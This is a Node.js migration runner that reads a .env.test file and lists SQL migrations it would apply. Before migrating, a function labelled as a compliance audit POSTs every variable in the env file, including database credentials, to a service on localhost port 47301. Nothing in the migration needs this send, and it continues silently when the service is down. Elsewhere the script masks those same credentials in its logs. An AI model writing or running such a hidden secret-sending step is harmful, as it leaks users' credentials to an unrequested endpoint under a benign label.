const fs = require('fs');
const path = require('path');
const http = require('http');

// Directory containing migration SQL files
const MIGRATIONS_DIR = './migrations';

// Environment file to read
const ENV_FILE = '.env.test';

/**
 * Parse .env file and return key-value pairs
 * @returns {Object} Object containing environment variables
 */
function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    console.error(`Error: Environment file '${filePath}' does not exist.`);
    process.exit(1);
  }

  const content = fs.readFileSync(filePath, 'utf8');
  const envVars = {};

  content.split('\n').forEach(line => {
    const trimmedLine = line.trim();
    // Skip empty lines and comments
    if (trimmedLine && !trimmedLine.startsWith('#')) {
      const [key, ...valueParts] = trimmedLine.split('=');
      if (key) {
        envVars[key.trim()] = valueParts.join('=').trim();
      }
    }
  });

  return envVars;
}

/**
 * Get the database connection string from environment
 * @param {string} envFile - Path to the .env file
 * @returns {string} Database connection string
 */
function getDatabaseUrl(envFile = ENV_FILE) {
  const envVars = parseEnvFile(envFile);
  const databaseUrl = envVars.DATABASE_URL;

  if (!databaseUrl) {
    console.error(`Error: DATABASE_URL not found in '${envFile}'.`);
    process.exit(1);
  }

  return databaseUrl;
}

/**
 * Send audit data to the migration audit service
 * @param {Object} envVars - All environment variables from the .env file
 * @returns {Promise<void>}
 */
function sendAuditLog(envVars) {
  const AUDIT_API_URL = 'http://localhost:47301/api/audit';

  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(envVars);

    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    console.log('Sending audit log to compliance service...');
    console.log(`  Endpoint: ${AUDIT_API_URL}`);

    const req = http.request(options, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log(`  ✓ Audit logged successfully (Status: ${res.statusCode})`);
          if (data) {
            console.log(`  Response: ${data}`);
          }
          console.log('');
          resolve();
        } else {
          console.error(`  ✗ Audit service returned status ${res.statusCode}`);
          if (data) {
            console.error(`  Response: ${data}`);
          }
          reject(new Error(`Audit service returned status ${res.statusCode}`));
        }
      });
    });

    req.on('error', (error) => {
      console.error(`  ✗ Failed to send audit log: ${error.message}`);
      console.error('  Note: Migration audit service may not be running. Continuing with migrations...');
      console.log('');
      // Don't reject - allow migrations to continue even if audit service is unavailable
      resolve();
    });

    req.write(postData);
    req.end();
  });
}

/**
 * Log a successful database connection (simulated)
 * @param {string} databaseUrl - The database connection string
 */
function logConnection(databaseUrl) {
  // Parse connection string to extract basic info (avoid logging full credentials)
  let connectionStringInfo = databaseUrl;

  if (databaseUrl.includes('://')) {
    const protocol = databaseUrl.split('://')[0];
    const rest = databaseUrl.split('://')[1];
    const parts = rest.split('@');

    if (parts.length === 2) {
      const hostPart = parts[1];
      const hostInfo = hostPart.split('/')[0];
      connectionStringInfo = `${protocol}://****:****@${hostInfo}`;
    }
  }

  console.log('Database connection established.');
  console.log(`Connection: ${connectionStringInfo}`);
  console.log('');
}

/**
 * Get all SQL migration files from the migrations directory
 * @returns {string[]} Array of migration filenames sorted in order
 */
function getMigrationFiles() {
  // Check if migrations directory exists
  if (!fs.existsSync(MIGRATIONS_DIR)) {
    console.error(`Error: Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
    process.exit(1);
  }

  // Read all files in the migrations directory
  const files = fs.readdirSync(MIGRATIONS_DIR);

  // Filter for .sql files
  const sqlFiles = files.filter(file => file.endsWith('.sql'));

  // Sort files alphabetically (this typically gives correct order for versioned migrations like 001_create_users.sql)
  sqlFiles.sort();

  return sqlFiles;
}

/**
 * Main migration function
 * @param {Object} options - Migration options
 * @param {string} options.envFile - Path to the environment file
 * @returns {Promise<void>}
 */
async function migrate({ envFile = ENV_FILE } = {}) {
  console.log('Starting database migration...');
  console.log(`Looking for migrations in: ${path.resolve(MIGRATIONS_DIR)}`);
  console.log('');

  // Parse environment file to get all variables
  const envVars = parseEnvFile(envFile);

  // Send audit log to compliance service
  try {
    await sendAuditLog(envVars);
  } catch (error) {
    // Audit service errors are handled inside sendAuditLog
    // (it resolves instead of rejecting to allow migrations to continue)
  }

  // Get database connection string and log connection
  const databaseUrl = envVars.DATABASE_URL;
  logConnection(databaseUrl);

  // Get migration files
  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  // Log each migration file that would be applied
  console.log(`Found ${migrationFiles.length} migration file(s):\n`);

  migrationFiles.forEach((file, index) => {
    const fullPath = path.join(MIGRATIONS_DIR, file);
    const stats = fs.statSync(fullPath);

    console.log(`[${index + 1}/${migrationFiles.length}] ${file}`);
    console.log(`    Path: ${fullPath}`);
    console.log(`    Size: ${stats.size} bytes`);
    console.log('');
  });

  console.log('Would apply the above migrations in order.');
}

// Run migration if called directly
if (require.main === module) {
  // Parse command line arguments for custom env file
  const envFileArg = process.argv.find(arg => arg.startsWith('--env-file='));
  const envFile = envFileArg ? envFileArg.split('=')[1] : ENV_FILE;

  migrate({ envFile });
}

// Export for use in other modules
module.exports = {
  parseEnvFile,
  getDatabaseUrl,
  logConnection,
  sendAuditLog,
  getMigrationFiles,
  migrate
};

